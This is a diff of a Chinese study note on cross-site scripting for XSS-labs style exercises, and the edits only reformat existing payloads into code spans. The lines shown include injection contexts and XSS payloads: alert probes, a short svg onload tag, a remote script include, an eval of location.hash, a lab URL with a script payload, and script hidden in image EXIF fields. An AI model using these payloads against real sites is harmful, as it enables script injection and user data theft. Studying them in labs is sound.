@@ -65,10 +65,10 @@ draft: false
 
 ##### 可能存在的位置：
 
-1. HTML标签之间	<div>你的输入</div>
-2. HTML属性值内        input value="你的输入">（XSS-labs大多数是这样）需要闭合引号
-3. script标签内           <script>var x="你的输入"</script>需要闭合字符串   可以输入**";alert(1)**
-4. CSS内                       style="background:你的输入"     可以输入**red; color: blue"**
+1. HTML标签之间	`<div>你的输入</div>`
+2. HTML属性值内        `<input value="你的输入">`（XSS-labs大多数是这样）需要闭合引号
+3. script标签内           `<script>var x="你的输入"</script>`需要闭合字符串   可以输入**";alert(1)**
+4. CSS内                       `style="background:你的输入"`     可以输入**red; color: blue"**
 
 #### 攻击方式
 
@@ -133,9 +133,9 @@ draft: false
 
    
 
-5. 长度限制：使用短标签：<svg/onload=alert(1)>   // 20字符
+5. 长度限制：使用短标签：`<svg/onload=alert(1)>`   // 20字符
 
-   外链远程脚本：<script src="//短链接"></script>
+   外链远程脚本：`<script src="//短链接"></script>`
 
    利用location.hash：eval(location.hash.slice(1))
 
@@ -283,7 +283,7 @@ CSS 不会直接执行 JavaScript，如果你在 style="background:你的输入"
 
 ### XSS基础代码
 
-> <script>alert(‘XSS’)</script>    弹窗测试（仅验证漏洞存在）
+> `<script>alert('XSS')</script>`    弹窗测试（仅验证漏洞存在）
 >
 >  无scirpt标签的XSS（绕过简单过滤），图片加载失败触发`onerror`执行脚本
 >
@@ -317,7 +317,7 @@ CSS 不会直接执行 JavaScript，如果你在 style="background:你的输入"
 
 **修改 Payload**:用不触发浏览器过滤器的方式：http://test.ctf8.com/level1.php?name
 
-浏览器会拦截http://test.ctf8.com/level1.php?name=<script>alert(`1`)</script>
+浏览器会拦截http://test.ctf8.com/level1.php?name=`<script>alert('1')</script>`
 
 onclick=alert(1)
 
@@ -560,7 +560,7 @@ if ($exif !== false) {
 
 在任意一张图片的属性的详细信息（在某个字段（如“作者”、“标题”、“备注”）中）输入
 
->  <script>alert(1)</script>
+>  `<script>alert(1)</script>`
 
 **EXIF**（Exchangeable Image File Format）是嵌入在图片文件中的一段元数据，可以理解为照片的**“电子身份证”**或**“拍摄日志”**。
 
